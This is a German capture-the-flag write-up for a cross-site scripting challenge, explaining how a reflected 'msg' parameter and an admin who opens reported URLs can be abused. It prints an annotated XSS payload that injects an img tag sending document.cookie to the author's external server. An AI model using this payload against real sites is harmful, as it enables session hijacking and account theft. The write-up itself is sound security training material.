# KREUZSEITEN

## Intro 
url: http://vuln3.redrocket.club:8111/
* quotes kann man über get anzeigen mit dem Paramter msg: /?msg=Mamas+sind+die+Besten
* allerdings wird nirgendwo was gespeichert, weil man kann sich auch random quotes anzeigen lassen, die noch keiner hinzugefügt haben kann
* man kann bugs reporten indem man die url dazu einfügt (das hört sich nach einer Schwachstelle an)
* da die Aufgabe Kreuzseiten heißt, geht man von cross site scripting aus (xss)
* Fabian meint man braucht einen webserver und muss sich das access log anzeigen lassen 
(macht ja auch sinn weil wir greifen den enduser an)

ich muss den apache server wieder stoppen: https://www.tecmint.com/install-apache-web-server-in-a-docker-container/

# KreuzSeiten

1. Der Admin scheint nur Links aufzurufen, die von der Inspirational Quote Seite kommen
2. Die Eingabe in das Formular wird auf der Folgeseite ohne vorheriges Sanatizing dargestellt
3. Als XSS Angriff kann ein img tag eingeschleust werden, dessen source tag auf einen eigenen Webserver verweist:

Diese URL wird als buggy reportet:

```javascript
http://vuln3.redrocket.club:8111/
//parameter is msg (it does not work on the actual bug page) 
// in parameter wird script eingebaut 
?msg=<script>

// document.write erzeugt einen String 
document.write(
// den string beginnen wir mit "hi und dann einen Link zu einem image 
"hi
// link zu image 
<img src=https://server.de/",
// aus dem link machen wir einen get-parameter, der den aktuell in der webanwendung bekannten cookie (vom admin) enthält 
"?cookie=",
// hier wird auf den aktuellen cookie zugegriffen 
document.cookie,
// wir schließen den link mit dem > tag und schließen den string der mit "hi begann mit einem " Zeichen 
">")
// wir beenden das dyn. java script 
</script>
```




